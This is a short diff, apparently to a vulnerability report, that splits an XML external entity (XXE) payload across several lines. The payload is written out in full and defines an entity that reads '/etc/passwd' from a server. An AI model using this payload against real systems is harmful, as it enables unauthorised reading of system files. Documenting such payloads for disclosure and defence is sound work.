@@ -15,7 +15,9 @@
 
   ‘/etc/passwd’ on the server. As in the example below :
   
-   ' <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+   ' <?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE foo [<!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
   <search>&xxe;</search> '
    
 **Impact estimation:**
